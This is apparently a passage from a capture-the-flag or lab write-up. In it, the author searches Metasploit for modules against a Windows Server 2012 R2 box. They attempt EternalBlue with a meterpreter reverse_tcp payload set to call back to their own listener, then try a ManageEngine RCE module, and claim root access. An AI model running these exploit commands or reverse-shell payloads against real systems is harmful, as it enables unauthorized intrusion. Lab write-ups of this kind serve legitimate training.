...
msf > search Windows Server 2012 R2  
...
  -   ----                                                              ---------------  ----       -----  -----------  
  0   exploit/windows/local/ms13_005_hwnd_broadcast                     2012-11-27       excellent  No     MS13-005 HWND_BROADCAST Low to Medium Integrity Privilege Escalation  
  1     \_ target: Windows x86                                          .                .          .      .  
  2     \_ target: Windows x64                                          .                .          .      .  
  3   auxiliary/scanner/http/ms15_034_http_sys_memory_dump              .                normal     Yes    MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure  
  4   exploit/windows/smb/ms17_010_eternalblue                          2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption  
  5     \_ target: Automatic Target                                     .                .          .      .  
  6     \_ target: Windows 7                                            .                .          .      .  
  7     \_ target: Windows Embedded Standard 7                          .                .          .      .  
  8     \_ target: Windows Server 2008 R2                               .                .          .      .  
  9     \_ target: Windows 8                                            .                .          .      .  
  10    \_ target: Windows 8.1                                          .                .          .      .  
  11    \_ target: Windows Server 2012                                  .                .          .      .  
  12    \_ target: Windows 10 Pro                                       .                .          .      .  
  13    \_ target: Windows 10 Enterprise Evaluation                     .                .          .      .  
  14  exploit/windows/http/manageengine_adaudit_plus_authenticated_rce  2021-10-01       excellent  Yes    ManageEngine ADAudit Plus Authenticated File Write RCE  
  15  auxiliary/gather/manageengine_adaudit_plus_xnode_enum             .                normal     Yes    ManageEngine ADAudit Plus Xnode Enumeration  
  16  auxiliary/gather/manageengine_datasecurity_plus_xnode_enum        .                normal     Yes    ManageEngine DataSecurity Plus Xnode Enumeration  
  17  exploit/windows/http/sap_configservlet_exec_noauth                2012-11-01       great      Yes    SAP ConfigServlet Remote Code Execution  
  18  post/windows/gather/exchange                                      .                normal     No     Windows Gather Exchange Server Mailboxes  
  19    \_ action: EXPORT                                               .                .          .      Export and download a chosen mailbox in the form of a .PST file, with support for an optional filter k  
eyword  
  20    \_ action: LIST                                                 .                .          .      List basic information about all Exchange servers and mailboxes hosted on the target  
  21  exploit/windows/local/cve_2018_8453_win32k_priv_esc               2018-10-09       manual     No     Windows NtUserSetWindowFNID Win32k User Callback  
  22  exploit/windows/persistence/service                               2018-10-20       excellent  Yes    Windows Persistent Service Installer  
  23  exploit/windows/local/srclient_dll_hijacking                      2021-02-19       normal     Yes    Windows Server 2012 SrClient DLL hijacking
```

We can see in the list :

`  4   exploit/windows/smb/ms17_010_eternalblue                          2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption`

I will start first by the exploit I know, even though it's rated average :

```bash
msf > use 4  
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp  
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.15.155  
LHOST => 10.10.15.155  
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.129.37.65  
RHOSTS => 10.129.37.65  
msf exploit(windows/smb/ms17_010_eternalblue) > set RPORT 80  
RPORT => 80  
msf exploit(windows/smb/ms17_010_eternalblue) > exploit  
[*] Started reverse TCP handler on 10.10.15.155:4444    
[*] 10.129.37.65:80 - Using auxiliary/scanner/smb/smb_ms17_010 as check  
[-] 10.129.37.65:80       - An SMB Login Error occurred while connecting to the IPC$ tree.  
[*] 10.129.37.65:80       - Scanned 1 of 1 hosts (100% complete)  
[-] 10.129.37.65:80 - The target is not vulnerable.
```

It didn't work because EternalBlue acts on SMB, not HTTP. So I should try something different.

```bash
msf > search Windows Server 2012 R2 http
```

I'll try `exploit/windows/http/manageengine_adaudit_plus_authenticated_rce 2021-10-01 excellent Yes ManageEngine ADAudit Plus Authenticated File Write RCE`

```bash
[-] Handler failed to bind to 10.10.15.155:80:-  -  
...
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
   + CategoryInfo          : InvalidOperation: (ufur:VariablePath) [], Runtim    
  eException  
   + FullyQualifiedErrorId : NonExistingVariableReference  
   
[!] NtImpersonateThread failed, exiting..  
...
And we goot root officially on my first black box engagement.